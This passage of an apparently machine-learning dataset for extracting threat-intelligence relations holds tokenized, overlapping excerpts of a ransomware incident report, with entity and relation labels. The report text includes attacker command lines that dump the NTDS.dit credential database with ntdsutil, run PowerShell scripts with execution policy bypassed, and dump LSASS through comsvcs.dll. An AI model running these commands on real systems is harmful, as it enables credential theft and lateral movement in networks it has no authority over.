"credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "PowerShell instructions", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "PowerShell", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "payload", "pos": [8, 9], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [34, 34], "name": "server", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "attacker", "pos": [6, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "environment", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "attackers", "pos": [30, 31], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "reconnaissance", "pos": [34, 35], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [136, 136], "name": "attacker", "pos": [7, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [143, 143], "name": "pivot", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [169, 169], "name": "attacker", "pos": [18, 19], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "PowerShell scripts", "pos": [23, 25], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [201, 201], "name": "adversaries", "pos": [50, 51], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [207, 207], "name": "PowerShell script", "pos": [56, 58], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [246, 246], "name": "actor", "pos": [3, 4], "index": "14_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [250, 250], "name": "credentials", "pos": [7, 8], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [265, 265], "name": "ntds.dit", "pos": [22, 23], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [268, 268], "name": "comsvcs.dll", "pos": [25, 26], "index": "17_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "EX", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "FR", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [4], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "RD", "evidence": [7], "h": 14, "t": 15}, {"r": "RD", "evidence": [7], "h": 14, "t": 16}, {"r": "RD", "evidence": [7], "h": 14, "t": 17}]}, {"title": "075-11", "sents": [["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "payload", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "server", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "attacker", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "environment", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "attackers", "pos": [30, 31], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "reconnaissance", "pos": [34, 35], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [114, 114], "name": "attacker", "pos": [7, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [121, 121], "name": "pivot", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [147, 147], "name": "attacker", "pos": [18, 19], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [152, 152], "name": "PowerShell scripts", "pos": [23, 25], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [179, 179], "name": "adversaries", "pos": [50, 51], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [185, 185], "name": "PowerShell script", "pos": [56, 58], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [224, 224], "name": "actor", "pos": [3, 4], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [228, 228], "name": "credentials", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [243, 243], "name": "ntds.dit", "pos": [22, 23], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [246, 246], "name": "comsvcs.dll", "pos": [25, 26], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [248, 248], "name": "Comsvcs.dll", "pos": [0, 1], "index": "16_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [255, 255], "name": "LSASS", "pos": [7, 8], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "RD", "evidence": [6], "h": 12, "t": 13}, {"r": "RD", "evidence": [6], "h": 12, "t": 14}, {"r": "RD", "evidence": [6], "h": 12, "t": 15}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}]}, {"title": "075-12", "sents": [["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "attacker", "pos": [6, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "environment", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "attackers", "pos": [30, 31], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [58, 58], "name": "reconnaissance", "pos": [34, 35], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [100, 100], "name": "attacker", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [107, 107], "name": "pivot", "pos": [14, 15], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [133, 133], "name": "attacker", "pos": [18, 19], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [138, 138], "name": "PowerShell scripts", "pos": [23, 25], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [165, 165], "name": "adversaries", "pos": [50, 51], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [171, 171], "name": "PowerShell script", "pos": [56, 58], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [210, 210], "name": "actor", "pos": [3, 4], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [214, 214], "name": "credentials", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [229, 229], "name": "ntds.dit", "pos": [22, 23], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [232, 232], "name": "comsvcs.dll", "pos": [25, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [234, 234], "name": "Comsvcs.dll", "pos": [0, 1], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [241, 241], "name": "LSASS", "pos": [7, 8], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [253, 253], "name": "comsvcs.dll", "pos": [2, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [255, 255], "name": "rundll32.exe", "pos": [4, 5], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [262, 262], "name": "dump", "pos": [11, 12], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 10, "t": 12}, {"r": "RD", "evidence": [5], "h": 10, "t": 13}, {"r": "RD", "evidence": [6], "h": 14, "t": 15}, {"r": "FR", "evidence": [7], "t": 16, "h": 17}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}]}, {"title": "075-13", "sents": [["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [30, 30], "name": "attackers", "pos": [30, 31], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [34, 34], "name": "reconnaissance", "pos": [34, 35], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [76, 76], "name": "attacker", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [83, 83], "name": "pivot", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [109, 109], "name": "attacker", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [114, 114], "name": "PowerShell scripts", "pos": [23, 25], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [141, 141], "name": "adversaries", "pos": [50, 51], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [147, 147], "name": "PowerShell script", "pos": [56, 58], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [186, 186], "name": "actor", "pos": [3, 4], "index": "8_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [190, 190], "name": "credentials", "pos": [7, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [205, 205], "name": "ntds.dit", "pos": [22, 23], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [208, 208], "name": "comsvcs.dll", "pos": [25, 26], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [210, 210], "name": "Comsvcs.dll", "pos": [0, 1], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [217, 217], "name": "LSASS", "pos": [7, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [229, 229], "name": "comsvcs.dll", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [231, 231], "name": "rundll32.exe", "pos": [4, 5], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [238, 238], "name": "dump", "pos": [11, 12], "index": "16_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [250, 250], "name": "NTDS.dit", "pos": [7, 8], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "RD", "evidence": [4], "h": 8, "t": 10}, {"r": "RD", "evidence": [4], "h": 8, "t": 11}, {"r": "RD", "evidence": [5], "h": 12, "t": 13}, {"r": "FR", "evidence": [6], "t": 14, "h": 15}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6, 7], "h": 15, "t": 17}]}, {"title": "075-14", "sents": [["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "attacker", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "pivot", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "attacker", "pos": [18, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "PowerShell scripts", "pos": [23, 25], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [72, 72], "name": "adversaries", "pos": [50, 51], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [78, 78], "name": "PowerShell script", "pos": [56, 58], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [117, 117], "name": "actor", "pos": [3, 4], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [121, 121], "name": "credentials", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [136, 136], "name": "ntds.dit", "pos": [22, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [139, 139], "name": "comsvcs.dll", "pos": [25, 26], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [141, 141], "name": "Comsvcs.dll", "pos": [0, 1], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [148, 148], "name": "LSASS", "pos": [7, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [160, 160], "name": "comsvcs.dll", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "rundll32.exe", "pos": [4, 5], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [169, 169], "name": "dump", "pos": [11, 12], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [181, 181], "name": "NTDS.dit", "pos": [7, 8], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [3], "h": 6, "t": 9}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "FR", "evidence": [5], "t": 12, "h": 13}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 15}]}, {"title": "075-15", "sents": [["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "attacker", "pos": [18, 19], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [23, 23], "name": "PowerShell scripts", "pos": [23, 25], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [50, 50], "name": "adversaries", "pos": [50, 51], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [56, 56], "name": "PowerShell script", "pos": [56, 58], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "actor", "pos": [3, 4], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [99, 99], "name": "credentials", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [114, 114], "name": "ntds.dit", "pos": [22, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [117, 117], "name": "comsvcs.dll", "pos": [25, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "Comsvcs.dll", "pos": [0, 1], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [126, 126], "name": "LSASS", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [138, 138], "name": "comsvcs.dll", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "rundll32.exe", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [147, 147], "name": "dump", "pos": [11, 12], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [159, 159], "name": "NTDS.dit", "pos": [7, 8], "index": "13_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 4, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 13}]}, {"title": "075-16", "sents": [["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "actor", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [34, 34], "name": "credentials", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "ntds.dit", "pos": [22, 23], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "comsvcs.dll", "pos": [25, 26], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": 